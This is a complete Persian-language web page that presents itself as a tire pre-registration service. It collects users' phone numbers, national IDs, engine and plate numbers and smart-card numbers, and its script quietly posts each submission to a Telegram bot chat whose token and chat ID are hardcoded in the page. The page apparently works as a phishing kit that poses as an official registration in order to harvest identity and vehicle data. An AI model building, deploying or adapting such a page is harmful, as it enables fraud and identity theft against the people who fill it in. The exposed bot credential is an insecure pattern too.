<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>سامانه پیش ثبت‌نام لاستیک</title>
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Vazirmatn', Tahoma, sans-serif; }
    body { background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; color: #102a43; }
    .card { background: #ffffff; width: 100%; max-width: 640px; border-radius: 18px; box-shadow: 0 12px 32px rgba(16, 42, 67, 0.1); overflow: hidden; }
    .card-header { background: linear-gradient(135deg, #1e3a8a 0%, #2563eb 100%); color: #ffffff; padding: 28px 24px; text-align: center; }
    .card-header h1 { font-size: 1.45rem; font-weight: 700; margin-bottom: 8px; }
    .card-header p { font-size: 0.92rem; opacity: 0.9; }
    form { padding: 28px 24px; }
    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; }
    @media (max-width: 580px) { .form-grid { grid-template-columns: 1fr; } }
    .form-group { display: flex; flex-direction: column; }
    .form-group label { font-size: 0.9rem; font-weight: 600; margin-bottom: 7px; color: #243b53; }
    .form-group input { padding: 12px 14px; font-size: 1rem; border: 1.5px solid #cbd5e1; border-radius: 10px; background-color: #f8fafc; color: #0f172a; transition: all 0.2s ease; outline: none; }
    .form-group input:focus { border-color: #2563eb; background-color: #ffffff; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
    .form-group input.input-error { border-color: #dc2626; background-color: #fef2f2; }
    .alert { display: none; padding: 13px 16px; border-radius: 10px; font-size: 0.95rem; font-weight: 600; margin-bottom: 20px; text-align: center; }
    .alert-error { background-color: #fee2e2; color: #b91c1c; border: 1px solid #fca5a5; }
    .alert-success { background-color: #dcfce7; color: #15803d; border: 1px solid #86efac; }
    .submit-btn { margin-top: 24px; width: 100%; padding: 14px; font-size: 1.05rem; font-weight: 700; color: #ffffff; background: #2563eb; border: none; border-radius: 12px; cursor: pointer; transition: background 0.2s ease, transform 0.1s ease; }
    .submit-btn:hover { background: #1d4ed8; }
    .submit-btn:active { transform: scale(0.99); }
    .submit-btn:disabled { background: #94a3b8; cursor: not-allowed; }
  </style>
</head>
<body>

  <div class="card">
    <div class="card-header">
      <h1>سامانه پیش ثبت‌نام لاستیک</h1>
      <p>لطفاً مشخصات خود و خودرو را با دقت در کادرهای زیر وارد نمایید</p>
    </div>

    <form id="tireForm" novalidate>
      <div id="statusMessage" class="alert"></div>

      <div class="form-grid">
        <div class="form-group">
          <label for="phone">شماره تماس</label>
          <input type="tel" id="phone" placeholder="مثال: 09123456789" />
        </div>
        <div class="form-group">
          <label for="nationalId">کد ملی</label>
          <input type="text" id="nationalId" inputmode="numeric" maxlength="10" placeholder="کد ملی ۱۰ رقمی" />
        </div>
        <div class="form-group">
          <label for="carModel">مدل ماشین</label>
          <input type="text" id="carModel" placeholder="مثال: پژو پارس / کشنده فوتون" />
        </div>
        <div class="form-group">
          <label for="engineNumber">شماره موتور</label>
          <input type="text" id="engineNumber" placeholder="شماره موتور مندرج در کارت" />
        </div>
        <div class="form-group">
          <label for="plateNumber">شماره پلاک</label>
          <input type="text" id="plateNumber" placeholder="مثال: ۱۲ ع ۳۴۵ - ایران ۶۷" />
        </div>
        <div class="form-group">
          <label for="smartCard">کارت هوشمند</label>
          <input type="text" id="smartCard" placeholder="شماره کارت هوشمند" />
        </div>
      </div>

      <button type="submit" id="submitBtn" class="submit-btn">ثبت اطلاعات</button>
    </form>
  </div>

  <script>
    const BOT_TOKEN = "9187602478:AAEl9qI4UZMV-pcfU5qMd--FHS7ALTH0qts";
    const CHAT_ID = "-1004305259085";

    const form = document.getElementById("tireForm");
    const statusMessage = document.getElementById("statusMessage");
    const submitBtn = document.getElementById("submitBtn");

    const fields = [
      { id: "phone", label: "شماره تماس" },
      { id: "nationalId", label: "کد ملی" },
      { id: "carModel", label: "مدل ماشین" },
      { id: "engineNumber", label: "شماره موتور" },
      { id: "plateNumber", label: "شماره پلاک" },
      { id: "smartCard", label: "کارت هوشمند" }
    ];

    fields.forEach(field => {
      const inputEl = document.getElementById(field.id);
      inputEl.addEventListener("input", () => {
        if (inputEl.value.trim() !== "") {
          inputEl.classList.remove("input-error");
        }
      });
    });

    function showMessage(text, type) {
      statusMessage.textContent = text;
      statusMessage.className = "alert " + (type === "error" ? "alert-error" : "alert-success");
      statusMessage.style.display = "block";
      statusMessage.scrollIntoView({ behavior: "smooth", block: "nearest" });
    }

    function escapeHtml(str) {
      return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }

    form.addEventListener("submit", async function (e) {
      e.preventDefault();
      statusMessage.style.display = "none";
      let hasEmptyField = false;
      const values = {};

      fields.forEach(field => {
        const inputEl = document.getElementById(field.id);
        const val = inputEl.value.trim();
        values[field.id] = val;
        if (val === "") {
          inputEl.classList.add("input-error");
          hasEmptyField = true;
        } else {
          inputEl.classList.remove("input-error");
        }
      });

      if (hasEmptyField) {
        showMessage("لطفاً همه کادرها را کامل کنید", "error");
        return;
      }

      submitBtn.disabled = true;
      submitBtn.textContent = "در حال ارسال اطلاعات...";

      const now = new Intl.DateTimeFormat("fa-IR", { dateStyle: "short", timeStyle: "short" }).format(new Date());

      const telegramText =
        `🛞 <b>پیش ثبت‌نام جدید لاستیک</b>\n` +
        `━━━━━━━━━━━━━━━\n` +
        `📞 <b>شماره تماس:</b> ${escapeHtml(values.phone)}\n` +
        `🆔 <b>کد ملی:</b> ${escapeHtml(values.nationalId)}\n` +
        `🚗 <b>مدل ماشین:</b> ${escapeHtml(values.carModel)}\n` +
        `⚙️ <b>شماره موتور:</b> ${escapeHtml(values.engineNumber)}\n` +
        `🔢 <b>شماره پلاک:</b> ${escapeHtml(values.plateNumber)}\n` +
        `💳 <b>کارت هوشمند:</b> ${escapeHtml(values.smartCard)}\n` +
        `━━━━━━━━━━━━━━━\n` +
        `🕒 <b>زمان ثبت:</b> ${now}`;

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: telegramText,
            parse_mode: "HTML"
          })
        });
        const result = await response.json();
        if (response.ok && result.ok) {
          showMessage("ثبت‌نام شما با موفقیت انجام شد", "success");
          form.reset();
        } else {
          showMessage("خطا در ثبت اطلاعات. لطفاً مجدداً تلاش کنید.", "error");
        }
      } catch (error) {
        showMessage("خطا در برقراری ارتباط. فیلترشکن خود را بررسی کنید.", "error");
      } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = "ثبت اطلاعات";
      }
    });
  </script>
</body>
</html>
